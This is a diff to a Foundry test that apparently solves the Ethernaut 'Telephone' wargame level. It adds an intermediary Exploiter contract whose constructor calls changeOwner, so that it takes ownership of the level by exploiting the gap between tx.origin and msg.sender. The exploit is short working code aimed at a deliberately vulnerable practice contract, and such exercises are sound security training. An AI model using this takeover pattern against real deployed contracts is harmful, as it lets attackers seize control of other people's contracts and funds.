@@ -34,11 +34,14 @@ contract TestTelephone is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
-        vm.startPrank(player, player);
-
-
+        vm.startPrank(player);
+        Exploiter exp = new Exploiter(address(player), level);
         vm.stopPrank();
+    }
+}
+
+contract Exploiter {
+    constructor(address target, Telephone telephone) public {
+        telephone.changeOwner(target);
     }
 }
